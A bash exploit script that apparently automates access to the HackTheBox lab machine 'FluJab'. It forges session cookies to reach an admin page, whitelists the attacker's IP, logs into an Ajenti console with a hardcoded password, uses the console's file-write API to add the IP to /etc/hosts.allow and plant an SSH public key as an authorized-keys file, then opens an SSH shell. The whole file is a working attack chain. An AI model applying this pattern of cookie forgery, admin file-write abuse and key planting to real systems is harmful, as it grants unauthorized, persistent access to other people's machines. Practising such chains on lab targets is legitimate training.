#!/bin/bash

ip=$(ip addr show tun0 | grep -oP "10\.10\.\d+\.\d+" | grep -v 255)
patient_cookie=$(echo -n ${ip} | md5sum | cut -d' ' -f1)

# add my ip to whitelist
curl -s -k https://freeflujab.htb/?smtp_config -H "Cookie: Patient=${patient_cookie}; Registered=ZDVkMjc4MjI5NTFmY2Q5ZWU4MjM4MGVhNTkzNDRiNjk9VHJ1ZQ%3D%3D; Modus=Q29uZmlndXJlPVRydWU%3D" -d "mailserver=${ip}&port=25&save=Save+Mail+Server+Config" > /dev/null

# check whitelist
curl -s -k https://freeflujab.htb/?whitelist -H "Cookie: Patient=${patient_cookie}; Registered=ZDVkMjc4MjI5NTFmY2Q5ZWU4MjM4MGVhNTkzNDRiNjk9VHJ1ZQ%3D%3D; Modus=Q29uZmlndXJlPVRydWU%3D" | grep -q ${ip} || { echo "Failed to add ${ip} to whitelist"; exit 1; }
echo "[+] Added ${ip} to whitelist"

# log into Ajenti
echo "[*] Will log into Ajenti"
echo "[*] Can take up to two minutes for whitelist to propegate"

success=false

for i in $(seq 1 20); do
    cookie=$(curl -v -s -k https://sysadmin-console-01.flujab.htb:8080/api/core/auth -d '{"mode": "normal", "password": "th3doct0r", "username": "sysadm"}' 2>&1 | grep Set-Cookie | grep -oP "[a-f0-9]{40}")
    if [[ ! -z $cookie ]]; then
        success=true
        break
    fi
    sleep 5
done

if [[ $success = false ]]; then
    echo "[-] Failed to get cookie for Ajenti login"
    exit 1
fi
echo "[+] Got session cookie: ${cookie}"

# add to /etc/hosts.allow file
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write//etc/hosts.allow -d "sshd: ${ip}" | grep -qE "^null$" || { echo "[-] Upload of ip to /etc/hosts.allow failed"; exit 1; }
echo "[+] Added ${ip} to /etc/hosts.allow"

# upload public key
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write//home/sysadm/access -d @/home/sysadm_id_rsa.pub | grep -qE "^null$" || { echo "[-] Upload of public key failed"; exit 1; }
echo "[+] Uploaded private key to /home/sysadm/access"

# change permissions on file
# 600 base 8 = 384
curl -s -k -H "Cookie: session=${cookie};" https://sysadmin-console-01.flujab.htb:8080/api/filesystem/chmod//home/sysadm/access -d '{"mode": 384}' | grep -qE "^null$" || { echo "[-] chmod of public key failed"; exit 1; }
echo "[+] AuthorizedKeyFile changed to 600"

ssh -i /home/sysadm_id_rsa sysadm@10.10.10.124 -t bash
